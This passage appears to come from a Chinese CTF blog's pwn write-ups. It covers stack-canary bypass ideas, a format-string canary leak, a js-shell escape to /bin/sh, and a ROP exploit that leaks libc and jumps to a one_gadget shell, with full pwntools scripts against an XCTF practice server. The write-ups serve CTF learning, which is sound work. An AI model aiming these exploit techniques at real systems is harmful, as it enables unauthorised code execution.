<li>2.Hijack __stack_chk_fail<br> 当Canary验证失败的时候是进入到stack_chk_failed函数中，它在该函数中完成报错输出，但是如果我们能够劫持该函数，让它不在完成该功能，那么Canary就形同虚设，我们就可以为所欲为栈溢出了<br> 但需要注意的是：这种技术并不是我们一般方式的Hijack GOT表，一般我们HijackGOT是GOT表绑定了真实地址之后，我们修改它，让程序执行其他的函数。 Got表中要绑定真实地址必须是得执行过一次，然而stack_chk_failed执行第一次的时候程序就报错退出了，因此我们需要Overwrite的尚未执行过的stack_chk_failed的GOT表项，此时GOT表中应该存贮这stack_chk_failed PLT[1]的地址</li>
<li><ol>
<li>通过一些其他的机制跳过canary的检查，比如Shanghai-DCTF-2017 线下攻防Pwn题 中：–利用c++异常机制绕过canary检查</li>
</ol>
</li>
</ul>
<p>通过格式化字符串泄露canary,这个程序是64位程序，写入参数的时，是先存入六个寄存器中的，故参数偏移为6+0x88/8=6+17=23.</p>
<p>EXP:</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#!usr/bin/python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">io</span> = remote(&#x27;<span class="hljs-number">111.198.29.45</span>&#x27;,<span class="hljs-number">58555</span>)<br><span class="hljs-attribute">cat_flag</span>=<span class="hljs-number">0</span>x<span class="hljs-number">4008</span>DA<br><span class="hljs-attribute">io</span>.sendlineafter(<span class="hljs-string">&quot;battle&quot;</span>,str(<span class="hljs-number">2</span>))<br><span class="hljs-attribute">sleep</span>(<span class="hljs-number">0</span>.<span class="hljs-number">2</span>)<br><span class="hljs-attribute">io</span>.sendline(<span class="hljs-string">&quot;%23$p&quot;</span>)<br><span class="hljs-attribute">sleep</span>(<span class="hljs-number">0</span>.<span class="hljs-number">2</span>)<br><span class="hljs-attribute">io</span>.recvuntil(&#x27;<span class="hljs-number">0</span>x&#x27;)<br><span class="hljs-attribute">canary</span>=int(io.recv(<span class="hljs-number">16</span>),<span class="hljs-number">16</span>)<br><span class="hljs-attribute">io</span>.sendlineafter(<span class="hljs-string">&quot;battle&quot;</span>,str(<span class="hljs-number">1</span>))<br><span class="hljs-attribute">payload</span>=<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0</span>x<span class="hljs-number">88</span>+p<span class="hljs-number">64</span>(canary)+p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>)+p<span class="hljs-number">64</span>(cat_flag)<br><span class="hljs-attribute">io</span>.sendline(payload)<br><span class="hljs-attribute">io</span>.interactive()<br></code></pre></td></tr></table></figure>



<h2 id="monkey–-XCTF-3rd-BCTF-2017"><a href="#monkey–-XCTF-3rd-BCTF-2017" class="headerlink" title="monkey– XCTF 3rd-BCTF-2017"></a>monkey– XCTF 3rd-BCTF-2017</h2><p>题目给的是一个js shell,在ida中找到os.system,试一下</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs vim">➤ nc <span class="hljs-number">111.198</span>.<span class="hljs-number">29.45</span> <span class="hljs-number">51022</span><br>js&gt; os.<span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br>os.<span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br><span class="hljs-keyword">ls</span><br>bin<br>dev<br>flag<br>js<br>lib<br>lib32<br>lib64<br>libnspr4.<span class="hljs-keyword">so</span><br>libplc4.<span class="hljs-keyword">so</span><br>libplds4.<span class="hljs-keyword">so</span><br>run.<span class="hljs-keyword">sh</span><br><span class="hljs-keyword">cat</span> flag<br>cyberpeace&#123;<span class="hljs-number">413</span>b97dd2d9e00d68d9a2caca0d25591&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">js</span>&gt; os.system(<span class="hljs-string">&quot;ls&quot;</span>)<br><span class="hljs-attribute">os</span>.system(<span class="hljs-string">&quot;ls&quot;</span>)<br><span class="hljs-attribute">bin</span><br><span class="hljs-attribute">dev</span><br><span class="hljs-attribute">flag</span><br><span class="hljs-attribute">js</span><br><span class="hljs-attribute">lib</span><br><span class="hljs-attribute">lib32</span><br><span class="hljs-attribute">lib64</span><br><span class="hljs-attribute">libnspr4</span>.so<br><span class="hljs-attribute">libplc4</span>.so<br><span class="hljs-attribute">libplds4</span>.so<br><span class="hljs-attribute">run</span>.sh<br><span class="hljs-attribute">js</span>&gt; os.system(<span class="hljs-string">&quot;cat flag&quot;</span>)<br><span class="hljs-attribute">os</span>.system(<span class="hljs-string">&quot;cat flag&quot;</span>)<br><span class="hljs-attribute">cyberpeace</span>&#123;<span class="hljs-number">413</span>b<span class="hljs-number">97</span>dd<span class="hljs-number">2</span>d<span class="hljs-number">9</span>e<span class="hljs-number">00</span>d<span class="hljs-number">68</span>d<span class="hljs-number">9</span>a<span class="hljs-number">2</span>caca<span class="hljs-number">0</span>d<span class="hljs-number">25591</span>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><pre><code>Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
</code></pre>
<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig">➤ <span class="hljs-string">ROPgadget</span> <span class="hljs-built_in">--binary</span> <span class="hljs-string">babystack</span>  <span class="hljs-built_in">--only</span> <span class="hljs-string">&#x27;pop|ret&#x27;</span> | <span class="hljs-string">grep</span> <span class="hljs-string">&#x27;rdi&#x27;</span><br><span class="hljs-string">0x0000000000400a93</span> : <span class="hljs-string">pop</span> <span class="hljs-string">rdi</span> ; <span class="hljs-string">ret</span><br></code></pre></td></tr></table></figure>



<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function">int64 __fastcall <span class="hljs-title">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-keyword">char</span> **a2, <span class="hljs-keyword">char</span> **a3)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// eax</span><br>  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [rsp+10h] [rbp-90h]</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v6; <span class="hljs-comment">// [rsp+98h] [rbp-8h]</span><br><br>  v6 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">setvbuf</span>(stdin, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">setvbuf</span>(stderr, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  <span class="hljs-built_in">memset</span>(&amp;s, <span class="hljs-number">0</span>, <span class="hljs-number">0x80</span>uLL);<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-built_in">sub_4008B9</span>();<br>    v3 = <span class="hljs-built_in">sub_400841</span>();<br>    <span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> ( v3 )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">puts</span>(&amp;s);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, &amp;s, <span class="hljs-number">0x100</span>uLL);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-built_in">sub_400826</span>(<span class="hljs-string">&quot;invalid choice&quot;</span>);<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-built_in">sub_400826</span>((<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *)&amp;unk_400AE7);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>Stack of main:</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stata">-0000000000000090 s               <span class="hljs-keyword">db</span> ?<br>-000000000000008F                 <span class="hljs-keyword">db</span> ? ; undefined<br>................                                      0x88<br>-0000000000000009                 <span class="hljs-keyword">db</span> ? ; undefined<br>______________________________________________________<br>-0000000000000008 var_8           dq ?    <span class="hljs-comment">//canary,共8字节，第一个字节是&#x27;\x00&#x27;,其余随机</span><br>+0000000000000000  s              <span class="hljs-keyword">db</span> 8 dup(?)    <span class="hljs-comment">//saved rbp</span><br>+0000000000000008  r              <span class="hljs-keyword">db</span> 8 dup(?)    <span class="hljs-comment">//ret</span><br>+0000000000000010<br>+0000000000000010 ; end of <span class="hljs-keyword">stack</span> variables<br>There may be <span class="hljs-keyword">two</span> special fields <span class="hljs-keyword">in</span> this <span class="hljs-keyword">window</span>: <span class="hljs-string">&quot; r&quot;</span> and <span class="hljs-string">&quot; s&quot;</span>. They represent the size of the function <span class="hljs-keyword">return</span> address and of the saved registers <span class="hljs-keyword">in</span> bytes.<br></code></pre></td></tr></table></figure>



<p>试了一下可以用one_gadget</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"> one_gadget libc-<span class="hljs-number">2.23</span><span class="hljs-number">.</span>so <br><span class="hljs-number">0x45216</span> execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-built_in">rsp</span>+<span class="hljs-number">0x30</span>, environ)<br><span class="hljs-symbol">constraints:</span><br>  <span class="hljs-built_in">rax</span> == NULL<br><br><span class="hljs-number">0x4526a</span> execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-built_in">rsp</span>+<span class="hljs-number">0x30</span>, environ)<br><span class="hljs-symbol">constraints:</span><br>  [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">0x30</span>] == NULL<br><br><span class="hljs-number">0xf0274</span> execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-built_in">rsp</span>+<span class="hljs-number">0x50</span>, environ)<br><span class="hljs-symbol">constraints:</span><br>  [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">0x50</span>] == NULL<br><br><span class="hljs-number">0xf1117</span> execve(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-built_in">rsp</span>+<span class="hljs-number">0x70</span>, environ)<br><span class="hljs-symbol">constraints:</span><br>  [<span class="hljs-built_in">rsp</span>+<span class="hljs-number">0x70</span>] == NULL<br></code></pre></td></tr></table></figure>

<p>注意：</p>
<p>①canary为防止泄露，第一位已知为’\x00’<br>②puts()函数输出时，遇到’\x00’才停止，即使字符串中存在’\n’,也会继续输出<br>③read函数在读取长度限制内，能够把’\n’也读进字符串中 </p>
<p>思路：</p>
<p>1.借puts输出canary.</p>
<p>2.通过puts泄露puts真实地址，得到libc与程序在内存中的偏移libc_base</p>
<p>3.借助one_gadget得到 execve(“/bin/sh”) </p>
<p>EXP:</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#!usr/bin/python</span><br><span class="hljs-attribute">from</span> pwn import *<br><br><span class="hljs-attribute">io</span> = remote(&#x27;<span class="hljs-number">111.198.29.45</span>&#x27;, <span class="hljs-number">32987</span>)<br><br><span class="hljs-comment"># io = process(&#x27;./babystack&#x27;)</span><br><br><span class="hljs-attribute">elf</span> = ELF(&#x27;./babystack&#x27;)<br><span class="hljs-attribute">libc</span> = ELF(&#x27;./libc-<span class="hljs-number">2</span>.<span class="hljs-number">23</span>.so&#x27;)<br><br><span class="hljs-attribute">rdi_ret</span> = <span class="hljs-number">0</span>x<span class="hljs-number">0000000000400</span>a<span class="hljs-number">93</span>        #pop rdi ; ret<br><span class="hljs-attribute">start_addr</span> = <span class="hljs-number">0</span>x<span class="hljs-number">0000000000400720</span><br><span class="hljs-attribute">puts_got</span> = elf.got[&#x27;puts&#x27;]<br><span class="hljs-attribute">puts_plt</span> = elf.plt[&#x27;puts&#x27;]<br><span class="hljs-attribute">one_gadget</span> = <span class="hljs-number">0</span>x<span class="hljs-number">45216</span><br><br><span class="hljs-attribute">success</span>(<span class="hljs-string">&quot;========leak canary========&quot;</span>)<br><span class="hljs-attribute">io</span>.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>, str(<span class="hljs-number">1</span>))<br><span class="hljs-attribute">payload</span> = <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0</span>x<span class="hljs-number">88</span><br><span class="hljs-attribute">io</span>.sendline(payload)<br><span class="hljs-attribute">io</span>.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>, str(<span class="hljs-number">2</span>))<br><span class="hljs-attribute">io</span>.recvuntil(<span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0</span>x<span class="hljs-number">88</span> + &#x27;\n&#x27;)<br><span class="hljs-attribute">canary</span> = u<span class="hljs-number">64</span>(io.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>, &#x27;\x<span class="hljs-number">00</span>&#x27;))<br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;canary=&gt;&quot;</span> +hex(canary))<br><br><span class="hljs-attribute">success</span>(<span class="hljs-string">&quot;========leak libc_base========&quot;</span>)<br><span class="hljs-attribute">io</span>.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>, str(<span class="hljs-number">1</span>))<br><span class="hljs-attribute">payload</span> = <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0</span>x<span class="hljs-number">88</span> + p<span class="hljs-number">64</span>(canary) + p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>) + p<span class="hljs-number">64</span>(rdi_ret) + p<span class="hljs-number">64</span>(puts_got) + p<span class="hljs-number">64</span>(puts_plt) + p<span class="hljs-number">64</span>(start_addr)#   puts(puts)<br><span class="hljs-attribute">io</span>.sendline(payload)<br><span class="hljs-attribute">io</span>.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>, str(<span class="hljs-number">3</span>))<br><br><span class="hljs-attribute">puts_addr</span> = u<span class="hljs-number">64</span>(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, &#x27;\x<span class="hljs-number">00</span>&#x27;))<br><span class="hljs-attribute">print</span> (<span class="hljs-string">&quot;puts_addr=&gt;&quot;</span> +hex(puts_addr))<br><span class="hljs-attribute">libc_base</span> = puts_addr - libc.symbols[&#x27;puts&#x27;]<br><span class="hljs-attribute">one_gadget</span> = libc_base + one_gadget<br><br><span class="hljs-attribute">success</span>(<span class="hljs-string">&quot;========get shell========&quot;</span>)<br><span class="hljs-attribute">io</span>.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>, str(<span class="hljs-number">1</span>))<br><span class="hljs-attribute">payload</span> = <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0</span>x<span class="hljs-number">88</span> + p<span class="hljs-number">64</span>(canary) + p<span class="hljs-number">64</span>(<span class="hljs-number">64</span>) + p<span class="hljs-number">64</span>(one_gadget) <br><span class="hljs-attribute">io</span>.sendline(payload)<br><span class="hljs-attribute">io</span>.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>, str(<span class="hljs-number">3</span>))<br><br><br><span class="hljs-attribute">io</span>.interactive()<br></code></pre></td></tr></table></figure>

<p>用system(“/bin/sh”),出现了小差错，无法解答</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[+]</span> ========<span class="hljs-keyword">get</span> shell========<br><span class="hljs-string">[*]</span> Switching to <span class="hljs-built_in">int</span>eractive mode<br>sh: <span class="hljs-number">1</span>: d: <span class="hljs-keyword">not</span> found<br><span class="hljs-string">[*]</span> Got EOF <span class="hljs-keyword">while</span> reading <span class="hljs-keyword">in</span> <span class="hljs-built_in">int</span>eractive<br></code></pre></td></tr></table></figure>

<p>而本地却可以get shell,很神奇……</p>
<h2 id="time-formatter"><a href="#time-formatter" class="headerlink" title="time_formatter"></a>time_formatter</h2><pre><code>Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
FORTIFY:  Enabled
</code></pre>
<p>基本功能：</p>
<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dos">➤ ./time_formatter <br>Welcome to Mary&#x27;s Unix <span class="hljs-built_in">Time</span> Formatter!<br><span class="hljs-number">1</span>) <span class="hljs-built_in">Set</span> a <span class="hljs-built_in">time</span> <span class="hljs-built_in">format</span>.<br><span class="hljs-number">2</span>) <span class="hljs-built_in">Set</span> a <span class="hljs-built_in">time</span>.<br><span class="hljs-number">3</span>) <span class="hljs-built_in">Set</span> a <span class="hljs-built_in">time</span> zone.<br><span class="hljs-number">4</span>) <span class="hljs-built_in">Print</span> your <span class="hljs-built_in">time</span>.<br><span class="hljs-number">5</span>) <span class="hljs-keyword">Exit</span>.<br></code></pre></td></tr></table></figure>


            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                
              </div>
              
                <p class="note note-warning">
                  
                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2022/02/21/AFL_FUZZ/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">afl fuzz入门</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022/02/20/syzkaller-fuzzing/">
                        <span class="hidden-mobile">Fuzzing linux kernel with syzkaller</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  

  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  <script  src="/js/local-search.js" ></script>



  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  
    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
  
  
    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
  






  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>















<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>


</body>
</html>
